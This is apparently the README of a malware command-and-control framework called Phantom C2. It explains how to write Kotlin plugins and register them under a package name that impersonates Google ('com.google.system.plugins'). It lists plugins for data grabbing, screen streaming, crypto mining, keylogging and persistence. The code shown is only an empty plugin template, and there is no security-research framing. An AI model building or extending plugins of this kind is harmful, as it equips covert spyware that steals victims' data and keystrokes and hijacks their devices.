# Phantom C2 Plugin System

## Structure

Each plugin is a directory containing:
- `plugin.json` - Plugin metadata and configuration
- `src/` - Kotlin source files

## Creating a Plugin

1. Create a directory under `plugins/`
2. Add `plugin.json`:
```json
{
  "id": "myplugin",
  "name": "My Plugin",
  "version": "1.0",
  "enabled": true,
  "settings": {}
}
```

3. Implement `Plugin` interface in Kotlin:
```kotlin
class MyPlugin : Plugin {
    override val id = "myplugin"
    override val name = "My Plugin"
    override val version = "1.0"
    override val commands = listOf("!mycmd")
    override val description = "Does something"
    
    override fun onEnable(context: Context): Boolean = true
    override fun onDisable() {}
    override fun handleCommand(cmd: String, payload: String?): String? = null
    override fun getConfig(): Map<String, Any> = emptyMap()
}
```

4. Register in `PluginManager.kt`:
```kotlin
"myplugin" to "com.google.system.plugins.MyPlugin"
```

## Available Plugins

| Plugin | ID | Commands | Description |
|---|---|---|---|
| Grabber | `grabber` | `!grabber` | Data extraction |
| Streamer | `streamer` | `!stream` | Screen streaming |
| Miner | `miner` | `!miner` | Crypto mining |
| Keylogger | `keylogger` | `!keylog` | Keystroke logging |
| Persistence | `persistence` | `!persist` | Auto-start |
